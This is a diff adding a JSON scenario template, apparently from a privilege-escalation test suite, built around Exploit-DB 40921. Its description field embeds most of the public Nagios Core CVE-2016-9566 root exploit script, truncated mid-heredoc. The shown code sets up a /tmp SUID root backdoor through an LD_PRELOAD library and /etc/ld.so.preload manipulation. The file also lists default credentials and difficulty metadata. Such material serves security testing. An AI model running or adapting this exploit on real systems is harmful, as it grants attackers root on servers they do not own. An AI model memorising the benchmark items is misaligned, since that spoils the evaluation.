@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_40921",
+  "category": "B1_ld_preload",
+  "attack_technique": "T1574.006",
+  "cwe": "CWE-427",
+  "description": "Linux privilege escalation: Nagios < 4.2.4 - Local Privilege Escalation (CVE-2016-9566)\n\nExploit source code (40921.sh):\n```\n#!/bin/bash\n#\n# Source: https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html\n#\n# Nagios Core < 4.2.4  Root Privilege Escalation PoC Exploit\n# nagios-root-privesc.sh (ver. 1.0)\n#\n# CVE-2016-9566\n#\n# Discovered and coded by:\n#\n# Dawid Golunski\n# dawid[at]legalhackers.com\n#\n# https://legalhackers.com\n#\n# Follow https://twitter.com/dawid_golunski for updates on this advisory\n#\n#\n# [Info]\n#\n# This PoC exploit allows privilege escalation from 'nagios' system account,\n# or an account belonging to 'nagios' group, to root (root shell).\n# Attackers could obtain such an account via exploiting another vulnerability,\n# e.g. CVE-2016-9565 linked below.\n#\n# [Exploit usage]\n#\n# ./nagios-root-privesc.sh path_to_nagios.log\n#\n#\n# See the full advisory for details at:\n# https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html\n#\n# Video PoC:\n# https://legalhackers.com/videos/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html\n#\n# CVE-2016-9565:\n# https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html\n#\n# Disclaimer:\n# For testing purposes only. Do no harm.\n#\n\nBACKDOORSH=\"/bin/bash\"\nBACKDOORPATH=\"/tmp/nagiosrootsh\"\nPRIVESCLIB=\"/tmp/nagios_privesc_lib.so\"\nPRIVESCSRC=\"/tmp/nagios_privesc_lib.c\"\nSUIDBIN=\"/usr/bin/sudo\"\ncommandfile='/usr/local/nagios/var/rw/nagios.cmd'\n\nfunction cleanexit {\n\t# Cleanup\n\techo -e \"\\n[+] Cleaning up...\"\n\trm -f $PRIVESCSRC\n\trm -f $PRIVESCLIB\n\trm -f $ERRORLOG\n\ttouch $ERRORLOG\n\tif [ -f /etc/ld.so.preload ]; then\n\t\techo -n > /etc/ld.so.preload\n\tfi\n\techo -e \"\\n[+] Job done. Exiting with code $1 \\n\"\n\texit $1\n}\n\nfunction ctrl_c() {\n        echo -e \"\\n[+] Ctrl+C pressed\"\n\tcleanexit 0\n}\n\n#intro\n\necho -e \"\\033[94m \\nNagios Core - Root Privilege Escalation PoC Exploit (CVE-2016-9566) \\nnagios-root-privesc.sh (ver. 1.0)\\n\"\necho -e \"Discovered and coded by: \\n\\nDawid Golunski \\nhttps://legalhackers.com \\033[0m\"\n\n# Priv check\necho -e \"\\n[+] Starting the exploit as: \\n\\033[94m`id`\\033[0m\"\nid | grep -q nagios\nif [ $? -ne 0 ]; then\n\techo -e \"\\n[!] You need to execute the exploit as 'nagios' user or 'nagios' group ! Exiting.\\n\"\n\texit 3\nfi\n\n# Set target paths\nERRORLOG=\"$1\"\nif [ ! -f \"$ERRORLOG\" ]; then\n\techo -e \"\\n[!] Provided Nagios log path ($ERRORLOG) doesn't exist. Try again. E.g: \\n\"\n\techo -e \"./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log\\n\"\n\texit 3\nfi\n\n# [ Exploitation ]\n\ntrap ctrl_c INT\n# Compile privesc preload library\necho -e \"\\n[+] Compiling the privesc shared library ($PRIVESCSRC)\"\ncat <<_solibeof_>$PRIVESCSRC\n#define _GNU_SOURCE\n#include <stdio.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <dlfcn.h>\n       #include <sys/types.h>\n       #include <sys/stat.h>\n       #include <fcntl.h>\n\nuid_t geteuid(void) {\n\tstatic uid_t  (*old_geteuid)();\n\told_geteuid = dlsym(RTLD_NEXT, \"geteuid\");\n\tif ( old_geteuid() == 0 ) {\n\t\tchown(\"$BACKDOORPATH\", 0, 0);\n\t\tchmod(\"$BACKDOORPATH\", 04777);\n\t\tunlink(\"/etc/ld.so.preload\");\n\t}\n\treturn old_geteuid();\n}\n_soli\n```",
+  "cve": "CVE-2016-9566",
+  "exploitdb_id": "40921",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_40921",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
